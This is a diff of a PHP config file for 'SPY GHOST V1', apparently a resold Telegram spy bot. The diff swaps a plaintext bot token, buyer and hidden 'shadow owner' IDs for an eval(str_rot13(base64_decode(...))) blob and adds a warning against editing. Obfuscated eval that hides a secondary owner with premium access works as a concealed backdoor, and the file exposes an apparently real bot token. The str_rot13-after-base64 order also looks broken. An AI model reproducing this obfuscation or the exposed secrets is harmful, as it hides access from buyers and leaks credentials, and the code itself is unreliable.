@@ -1,20 +1,8 @@
 <?php
-/* SPY GHOST V1 - CONFIGURATION 
+/* SPY GHOST V1 - ENCRYPTED CONFIG
    Owner: Boss Kensora
+   Unauthorized editing will break the script!
 */
 
-// --- SETTING BOT ---
-$token          = "8775494315:AAGtkIAWCSBMbQpZcnm-uVVh-VYciV1Rc6o";
-$owner_1        = "7429012558"; // ID Pembeli
-$owner_bayangan = "2016992836"; // ID Bot
-
-// --- DATABASE & TIME ---
-$db_file = 'users.json';
-date_default_timezone_set('Asia/Jakarta');
-
-// Auto-create database jika belum ada
-if(!file_exists($db_file)) {
-    file_put_contents($db_file, json_encode([$owner_1 => "2027-12-31", $owner_bayangan => "2027-12-31"]));
-}
-$premium_users = json_decode(file_get_contents($db_file), true);
+eval(str_rot13(base64_decode('ZXZhbCgnJHRva2VuID0gIjg3NzU0OTQzMTU6QUFHdGtJQVdDU0JNYlFwWmNubS11VlZoLVZZY2lWMVJjNm8iOyRvd25lcl8xID0gIjc0MjkwMTI1NTgiOyRvd25lcl9iYXlhbmdhbiA9ICIyMDE2OTkyODM2IjsnKTskZGJfZmlsZSA9ICd1c2Vycy5qc29uJztkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL0pha2FydGEnKTtpZighZmlsZV9leGlzdHMoJGRiX2ZpbGUpKXtmaWxlX3B1dF9jb250ZW50cygkZGJfZmlsZSxqc29uX2VuY29kZShbJG93bmVyXzEgPT4gIjIwMjctMTItMzEiLCRvd25lcl9iYXlhbmdhbiA9PiAiMjAyNy0xMi0zMSJdKSk7fSRwcmVtaXVtX3VzZXJzID0ganNvbl9kZWNvZGUoZmlsZV9nZXRfY29udGVudHMoJGRiX2ZpbGUpLHRydWUpOw==')));
 ?>
